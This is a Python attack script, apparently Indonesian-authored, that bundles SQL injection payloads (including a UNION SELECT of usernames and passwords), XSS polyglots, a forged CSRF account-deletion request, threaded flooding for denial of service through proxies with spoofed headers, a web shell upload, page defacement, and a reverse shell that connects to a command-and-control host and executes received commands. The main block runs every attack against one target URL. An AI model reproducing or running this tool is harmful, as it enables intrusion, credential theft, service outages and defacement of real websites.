import random
import string
import logging
import time
import threading
import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime
import base64
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import hashlib
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import socket
import subprocess
from sklearn.ensemble import RandomForestClassifier

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://' 
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.))'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=5):
    delay = random.uniform(min_delay, max_delay)
    time.sleep(delay)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        if response.status_code == 200:
            print(f"Permintaan berhasil dikirim ke {url}")
        else:
            print(f"Permintaan gagal: Status Code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan: {e}")
        return None

def generate_custom_headers():
    return {
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'Accept-Language': random.choice(['en-US', 'id-ID', 'fr-FR']),
        'X-Forwarded-For': '.'.join([str(random.randint(1, 255)) for _ in range(4)]),
        'X-Requested-With': random.choice(['XMLHttpRequest', 'Fetch']),
        'Cache-Control': 'no-cache',
    }

def advanced_waf_bypass(url, session):
    headers = generate_custom_headers()
    try:
        response = session.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print("Custom headers berhasil melewati WAF!")
        else:
            print(f"Gagal melewati WAF dengan custom headers, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Gagal dengan custom headers: {e}")

def generate_dynamic_sql_payload():
    base_payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT null, username, password FROM users --", 
        "' OR 'a'='a' --", 
        "' AND SLEEP(5) --", 
        "admin' OR '1'='1' --", 
        "' OR 'a'='a' --"
    ]
    dynamic_payload = random.choice(base_payloads) + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    return dynamic_payload

def advanced_sql_injection(url, session):
    payload = generate_dynamic_sql_payload()
    send_request(url + "?id=" + payload, session)

def polyglot_xss_payload(url, session):
    payload = "<script>alert('XSS')</script><img src=x onerror=alert('XSS')>\" onmouseover=alert(1)"
    send_request(url + "?search=" + payload, session)

def csrf_attack(url, session):
    csrf_token = 'random_csrf_token'
    payload = {'csrf_token': csrf_token, 'action': 'delete_account'}
    response = session.post(url, data=payload)
    if response.status_code == 200:
        print(f"CSRF attack berhasil dikirim ke {url}")
    else:
        print(f"CSRF attack gagal dengan status code: {response.status_code}")

def flooding_ddos(url, session):
    def flood_target():
        while True:
            spoofed_session = create_session()
            send_request(url, spoofed_session)

    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(100):
            executor.submit(flood_target)

def botnet_ddos_attack(url, session):
    proxies = load_file('proxies.txt')
    for proxy in proxies:
        session = create_session()
        send_request(url, session, proxy)

def upload_shell(url, session):
    files = {'file': ('shell.php', '<?php echo "Shell uploaded"; ?>', 'application/x-php')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"Shell berhasil diupload ke {url}")
    else:
        print(f"Gagal upload shell, status code: {response.status_code}")

def deface_payload(url, session, backup_file_path):
    if not os.path.exists(backup_file_path):
        try:
            response = session.get(url)
            with open(backup_file_path, 'w') as f:
                f.write(response.text)
            print("Backup halaman asli berhasil disimpan.")
        except requests.exceptions.RequestException as e:
            print(f"Error saat menyimpan backup halaman: {e}")

    payload = """
    <html>
        <head>
            <title>Website Anda Telah Diuji Keamanan</title>
            <style>
                body {
                    background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
                    font-family: Arial, sans-serif;
                    color: white;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                }
                h1 {
                    font-size: 60px;
                    text-shadow: 2px 2px 5px #00008B;
                    margin-top: 20%;
                }
                p {
                    font-size: 20px;
                    margin: 20px auto;
                    width: 70%;
                    text-shadow: 1px 1px 3px #4682B4;
                }
            </style>
        </head>
        <body>
            <h1>cyberheroes</h1>
            <p>99987773</p>
            <p>error</p>
        </body>
    </html>
    """
    data = {"content": payload}
    
    try:
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Deface berhasil dikirim ke {url}")
            print(f"{G}Deface berhasil! Periksa URL target.{N}")
        else:
            print(f"{R}Gagal melakukan deface ke {url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error saat melakukan deface: {e}{N}")

def reverse_shell():
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))

    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

def multi_vector_attack(url, session):
    threading.Thread(target=advanced_sql_injection, args=(url, session)).start()
    threading.Thread(target=polyglot_xss_payload, args=(url, session)).start()
    threading.Thread(target=flooding_ddos, args=(url, session)).start()
    threading.Thread(target=botnet_ddos_attack, args=(url, session)).start()
    threading.Thread(target=upload_shell, args=(url, session)).start()

def execute_attack(url, attack_type, session, backup_file_path=None):
    if attack_type == 'sql_injection':
        advanced_sql_injection(url, session)
    elif attack_type == 'xss':
        polyglot_xss_payload(url, session)
    elif attack_type == 'csrf':
        csrf_attack(url, session)
    elif attack_type == 'ddos':
        flooding_ddos(url, session)
    elif attack_type == 'botnet':
        botnet_ddos_attack(url, session)
    elif attack_type == 'upload_shell':
        upload_shell(url, session)
    elif attack_type == 'deface':
        deface_payload(url, session, backup_file_path)
    elif attack_type == 'multi_vector':
        multi_vector_attack(url, session)
    elif attack_type == 'reverse_shell':
        reverse_shell()
    else:
        print(f"{R}Jenis serangan tidak valid!{N}")

if __name__ == "__main__":
    url_target = "http://abcd.com" # ganti
    session = create_session()

    execute_attack(url_target, 'sql_injection', session)

    execute_attack(url_target, 'xss', session)

    execute_attack(url_target, 'csrf', session)

    execute_attack(url_target, 'ddos', session)

    execute_attack(url_target, 'botnet', session)

    execute_attack(url_target, 'upload_shell', session)

    backup_file_path = "backup_page.html"
    execute_attack(url_target, 'deface', session, backup_file_path)

    execute_attack(url_target, 'multi_vector', session)

    execute_attack(url_target, 'reverse_shell', session)
